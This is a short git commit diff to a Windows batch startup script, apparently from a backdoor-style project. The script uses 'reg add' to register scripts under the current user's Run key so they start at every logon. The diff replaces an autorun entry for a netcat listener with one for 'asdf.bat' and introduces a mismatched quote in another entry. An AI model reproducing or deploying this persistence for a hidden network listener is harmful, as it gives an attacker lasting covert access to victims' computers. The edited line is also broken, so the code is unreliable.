2bcff09ad7035e589e5bdca624a12e228f56eeb3
Dr-N0 <beckettjenen@gmail.com>
2023-11-18 18:52:26 -0500

    asdf

--- WindowsXp/_startup.bat
+++ WindowsXp/_startup.bat
@@ -9,6 +9,6 @@ REM Get the current directory
 set currentDirectory=%~dp0
 
 REM Create the registry value
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "runner" /t REG_SZ /d "\"%currentDirectory%runner.bat\"" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "runner" /t REG_SZ /d "%currentDirectory%runner.bat\" /f
 
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "netcatlistener" /t REG_SZ /d "%currentDirectory%netcatlistener.bat" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "asdf" /t REG_SZ /d "%currentDirectory%asdf.bat" /f
